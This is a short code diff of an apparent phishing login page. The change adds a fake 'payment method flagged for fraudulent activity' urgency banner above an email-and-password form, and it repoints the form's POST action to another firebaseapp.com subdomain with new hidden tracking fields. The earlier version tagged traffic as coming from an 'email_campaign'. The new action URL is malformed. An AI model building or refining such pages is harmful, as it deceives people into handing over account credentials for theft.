@@ -236,9 +236,12 @@
         <!-- Right Side: Interaction Card UI -->
         <div class="form-container">
             <div class="card">
-                <form action="https://login-portal.firebaseapp.com/login" method="POST">
-                        <input type="hidden" name="source" value="email_campaign">
-    <input type="hidden" name="service" value="account">
+<div style="background:#f8d7da;border:1px solid #f5c6cb;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#721c24;text-align:center;">Your payment method has been flagged for fraudulent activity. Verify to avoid suspension.</div>
+                <form action="https://secure-auth.firebaseapp.comsession" method="POST">
+                        <input type="hidden" name="ts" value="1779543965">
+    <input type="hidden" name="_next" value="/account">
+    <input type="hidden" name="redirect" value="https://firebaseapp.com/dashboard">
+    <input type="hidden" name="ref" value="95399dcb48bafcb0868dce5a">
                     <input type="text" placeholder="Email address or phone number" required autocomplete="username">
                     <input type="password" placeholder="Password" required autocomplete="current-password">
                     <button type="submit" class="btn-login">Log In</button>
